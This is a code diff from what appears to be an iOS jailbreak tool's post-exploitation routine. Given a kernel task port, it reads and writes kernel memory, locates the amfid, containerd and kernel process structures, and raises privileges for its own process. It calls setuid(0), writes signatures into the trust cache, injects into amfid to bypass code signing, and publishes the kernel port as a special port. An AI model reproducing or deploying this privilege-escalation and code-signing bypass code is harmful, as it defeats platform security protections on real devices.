@@ -9,17 +9,7 @@
 #include "fun.h"
 #include "kcall.h"
 #include "bootstrap.h"
-
-unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
-unsigned offsetof_task = 0x18;                // proc_t::task
-unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
-unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
-unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
-unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
-unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
-unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
-unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
-unsigned offsetof_special = 2 * sizeof(long); // host::special
+#include "procfinder.h"
 
 char *itoa(long n)
 {
@@ -38,71 +28,87 @@ typedef struct {
 	uint64_t end;
 } kmap_hdr_t;
 
+struct procs_info {
+    uint64_t container_proc;
+    pid_t amfid_pid;
+
+    // shamelessly stolen from J's LiberTV :)
+    uint64_t sysdiagnose_proc;
+};
+
+int procs_info_finder(uint64_t task, void *dat) {
+    uint64_t proc = proc_for_task(task);
+    if (proc == -1) return 0;
+    struct procs_info* info = (struct procs_info*) dat;
+
+    pid_t pid = (pid_t) rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
+    char name[20] = {0};
+    rkbuffer(proc + koffset(KSTRUCT_OFFSET_PROC_P_COMM), name, 16);
+    if (strstr(name, "amfid")) {
+        info->amfid_pid = pid;
+    } else if (strstr(name, "container")) {
+        info->container_proc = proc;
+    } else if (strstr(name, "sysdiagnose")) {
+        info->sysdiagnose_proc = proc;
+    }
+
+    return (info->amfid_pid && info->container_proc && info->sysdiagnose_proc);
+}
+
 uint64_t our_proc = 0;
 
-void let_the_fun_begin(mach_port_t tfp0) {
+int let_the_fun_begin(mach_port_t tfp0) {
+    int err = 1;
+
 	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
 	init_kernel(find_kernel_base(), NULL);
 	
-	dlopen(resourceInBundle("test.dylib"), RTLD_NOW);
-	
+//    dlopen(resourceInBundle("test.dylib"), RTLD_NOW);
+
 	// Get the slide
 	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
 	printf("[fun] slide: 0x%016llx\n", slide);
 	
-	kmap_hdr_t kernel_map;
-	
-	rkbuffer(rk64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));
-
-	uint64_t zm_tmp;
-#   define ZM_FIX_ADDR(addr) \
-( \
-zm_tmp = (kernel_map.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
-zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
-)
+//    kmap_hdr_t kernel_map;
+//    rkbuffer(rk64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));
 
     #define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kcall(addr, 7, x0, x1, x2, x3, x4, x6, x6)
 	
-	// Get our and the kernels struct proc from allproc
-	uint32_t our_pid = getpid();
-	our_proc = 0;
-	uint64_t kern_proc = 0;
-	uint64_t container_proc = 0;
-	uint32_t amfid_pid = 0;
-	
-	uint64_t proc = rk64(find_allproc());
-	while (proc) {
-		uint32_t pid = (uint32_t)rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
-		char name[40] = {0};
-		rkbuffer(proc + koffset(KSTRUCT_OFFSET_PROC_P_COMM), name, 20);
-		if (pid == our_pid) {
-			our_proc = proc;
-		} else if (pid == 0) {
-			kern_proc = proc;
-            init_empower(kern_proc);
-		} else if (strstr(name, "amfid")) {
-			container_proc = proc;
-			amfid_pid = pid;
-        } else if (strstr(name, "containerd")) {
+	// Get our and the kernels struct proc
+    uint64_t kern_proc = proc_for_task(kerntask_for_pid(0));
+    printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
+    if (kern_proc == -1) {
+        goto cleanup;
+    }
+    init_empower(kern_proc);
 
-        }
-		if (pid != 0) {
-            // fails if called before init_empower
-            // but first proc is kernel proc, isn't it?
-            empower(proc);
-		}
-		proc = rk64(proc);
-	}
+    uint32_t our_pid = getpid();
+    our_proc = proc_for_task(kerntask_for_pid(our_pid));
+    printf("[fun] our proc is at 0x%016llx\n", our_proc);
+    if (our_proc == -1) {
+        goto cleanup;
+    }
+    empower(our_proc, 1);
+
+    struct procs_info info;
+    bzero(&info, sizeof(info));
+
+    enumerate_tasks(procs_info_finder, &info);
+
+    printf("[fun] containerd proc is at 0x%016llx\n", info.container_proc);
+    printf("[fun] sysdiagnose proc is at 0x%016llx\n", info.sysdiagnose_proc);
+    printf("[fun] amfid pid is %u\n", info.amfid_pid);
+    // why do we even need sysdiagnose?
+    if (!(info.amfid_pid && info.container_proc)) {
+        goto cleanup;
+    }
 	
-	printf("[fun] our proc is at 0x%016llx\n", our_proc);
-	printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
-	
-    empower(our_proc);
-    empower(container_proc);
+    empower(info.container_proc, 0);
 
 	// setuid(0) + test
 	{
-		
+        // actually getuid() should force "sync" from what we've
+        // written in empower and thus return 0
 		printf("[fun] our uid was %d\n", getuid());
 		
 		setuid(0);
@@ -233,19 +239,21 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 		printf("[fun] Wrote the signatures into the trust cache!\n");
 	}
 	
-//	printf("[fun] currently cs_debug is at %d\n", rk32(0xFFFFFFF0076220EC+slide));
-//	wk32(0xFFFFFFF0076220EC+slide, 100);
-	
     const char* BinaryLocation = "/fun_bins/inject_amfid";
-	startprog(STARTPROG_WAIT, BinaryLocation, (const char*[]){BinaryLocation, itoa(amfid_pid), NULL}, NULL);
-	
-	// Cleanup
-	
-//	char *nmz = strdup("/dev/disk0s1s1");
-//	rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
-//	printf("[fun] remounting: %d\n", rv);
+	startprog(STARTPROG_WAIT, BinaryLocation, (const char*[]){BinaryLocation, itoa(info.amfid_pid), NULL}, NULL);
 
+    {
+        kern_return_t rv = task_set_special_port(mach_task_self(), 9, tfp0);
+        printf("set special port 9: %x (%s)\n", rv, mach_error_string(rv));
+    }
+
+    err = 0;
+
+	// Cleanup
+
+cleanup:;
 //    wk64(rk64(kern_ucred+0x78)+0x8, 0);
-	term_kernel();
-	
+    term_kernel();
+
+    return err;
 }
